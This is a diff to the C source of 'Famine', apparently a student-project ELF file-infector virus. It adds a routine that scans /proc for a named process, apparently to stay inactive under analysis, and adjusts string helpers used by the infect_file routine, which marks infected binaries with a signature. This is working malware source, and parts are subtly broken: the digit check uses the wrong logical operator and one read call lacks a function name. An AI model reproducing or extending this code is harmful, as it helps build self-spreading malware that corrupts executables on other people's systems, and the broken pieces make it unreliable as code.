@@ -10,11 +10,19 @@
 
 #define BUILDER_SIZE 0x151;
 #define BUILDER_RE_ENTRY_OFFSET 0xe5;
+
+#ifndef BAD_PROCESS_NAME
+#define BAD_PROCESS_NAME "zed"
+#endif
+
 __attribute__((section(".text"))) volatile static char signatur[] = "Famine | abied-ch & fbruggem";
 __attribute__((section(".text"))) volatile static char path_self[] = "/proc/self/exe";
 __attribute__((section(".text"))) volatile static char mappings_path[] = "/proc/self/maps";
+__attribute__((section(".text"))) volatile static char slash_proc[] = "/proc/";
+__attribute__((section(".text"))) volatile static char slash_cmdline[] = "/cmdline";
 __attribute__((section(".text"))) volatile static char incubation[] = "4242";
-// Structs
+__attribute__((section(".text"))) volatile static char bad_process_name[] = BAD_PROCESS_NAME;
+
 typedef struct {
     uint64_t d_ino;          /* 64-bit inode number */
     uint64_t d_off;          /* Not an offset; see getdents() */
@@ -73,10 +81,101 @@ __attribute__((always_inline)) inline uint64_t offset_to_addr(volatile file *fil
 __attribute__((always_inline)) inline int file_write(int fd, volatile file *file);
 __attribute__((always_inline)) inline uint64_t old_entry_get(volatile file *file);
 
+__attribute__((always_inline)) inline int ft_strstr(volatile char *haystack, volatile char *needle);
 __attribute__((always_inline)) inline int ft_strlen(volatile char *str);
 __attribute__((always_inline)) inline void ft_strncpy(volatile char *src, volatile char *dst, size_t size);
-__attribute__((always_inline)) inline int ft_strstr(volatile char *haystack, volatile char *needle, size_t size);
+__attribute__((always_inline)) inline int ft_strnstr(volatile char *haystack, volatile char *needle, size_t size);
 __attribute__((always_inline)) inline void ft_memcpy(volatile void *src, volatile void *dst, uint64_t size);
+
+
+__attribute__((always_inline)) inline void
+ft_strcat(volatile char* dst, volatile char* src) {
+    while (*dst) {
+        dst++;
+    }
+    for (int i = 0; src[i]; ++i) {
+        dst[i] = src[i];
+    }
+}
+
+__attribute__((always_inline)) static inline int
+ft_isdigit(const volatile char* const s) {
+    for (int i = 0; s[i]; ++i) {
+        if (s[i] < '0' && s[i] > '9') {
+            return 0;
+        }
+    }
+    return 1;
+}
+
+__attribute__((always_inline)) static inline volatile char *
+ft_strchr(volatile char*  s, const volatile char c) {
+    while (*s) {
+        if (*s == c) {
+            return s;
+        }
+        s++;
+    }
+    return 0;
+}
+
+__attribute__((always_inline)) static inline int
+bad_process_running() {
+    volatile char path[256];
+    volatile char cmdline_buf[1024];
+    volatile char getdents_buf[4096];
+
+    volatile int dirfd = ft_open(slash_proc, O_RDONLY, 0);
+    if (dirfd < 0) {
+        return 0;
+    }
+
+    path[0] = 0;
+    ft_strcat(path, slash_proc);
+
+    while (1) {
+        int64_t bytes_read = ft_getdents64(dirfd, (char*)getdents_buf, sizeof(getdents_buf));
+        if (bytes_read <= 0) {
+            break;
+        }
+        int64_t offset = 0;
+        while (offset < bytes_read) {
+            dirent64 *entry = (dirent64 *)(getdents_buf + offset);
+            offset += entry->d_reclen;
+            if (!ft_isdigit(entry->d_name)) {
+                continue;
+            }
+            const uint64_t len = ft_strlen(entry->d_name);
+            if (len + 14 > sizeof(path)) {
+                continue;
+            }
+            ft_strcat(path, entry->d_name);
+            ft_strcat(path, slash_cmdline);
+            int fd = ft_open(path, O_RDONLY, 0);
+            if (fd < 0) {
+                continue;
+            }
+            for (int i = 6; i < sizeof(path); ++i) {
+                path[i] = 0;
+            }
+            int64_t read_bytes = (fd, cmdline_buf, sizeof(cmdline_buf));
+            if (read_bytes < 0) {
+                continue;
+            }
+            ft_close(fd);
+            volatile char *space = ft_strchr(cmdline_buf, ' ');
+            if (space) {
+                *space = 0;
+            }
+            if (ft_strstr(bad_process_name, cmdline_buf)) {
+                ft_close(dirfd);
+                return 1;
+            }
+        }
+    }
+    ft_close(dirfd);
+    return 0;
+}
 
 __attribute__((always_inline)) inline void
 print_number_hex(volatile uint64_t num) {
@@ -289,7 +388,7 @@ infect_file(volatile char *path, volatile file *file_self) {
         return 1;
     };
 
-    const uint8_t target_has_signature = ft_strstr(file_target.mem, signatur, file_target.size);
+    const uint8_t target_has_signature = ft_strnstr(file_target.mem, signatur, file_target.size);
     if (target_has_signature) {
         file_munmap(&file_target);
         ft_close(fd_target);
@@ -365,7 +464,7 @@ infect_file(volatile char *path, volatile file *file_self) {
         return 0;
     }
 
-    if (!ft_strstr(file_target.mem, signatur, file_target.size)) {
+    if (!ft_strnstr(file_target.mem, signatur, file_target.size)) {
         ft_lseek(fd_target, SEEK_END, 0);
         ft_write(fd_target, signatur, 28);
     }
@@ -504,7 +603,26 @@ ft_strncpy(volatile char *src, volatile char *dst, size_t size) {
 }
 
 __attribute__((always_inline)) inline int
-ft_strstr(volatile char *haystack, volatile char *needle, size_t size) {
+ft_strstr(volatile char *haystack, volatile char *needle) {
+    uint64_t i = 0, j = 0;
+
+    while (haystack[i]) {
+        int32_t k = i;
+        while (haystack[k] && needle[j] && haystack[k] == needle[j]) {
+            j++;
+            k++;
+        }
+        if (!needle[j]) {
+            return 1;
+        }
+        j = 0;
+        i++;
+    }
+    return 0;
+}
+
+__attribute__((always_inline)) inline int
+ft_strnstr(volatile char *haystack, volatile char *needle, size_t size) {
     const uint64_t NEEDLE_SIZE = ft_strlen(needle);
     int i = 0;
     int j;
@@ -520,7 +638,7 @@ ft_strstr(volatile char *haystack, volatile char *needle, size_t size) {
             j++;
         }
         i++;
-}
+    }
     return (0);
 }
 
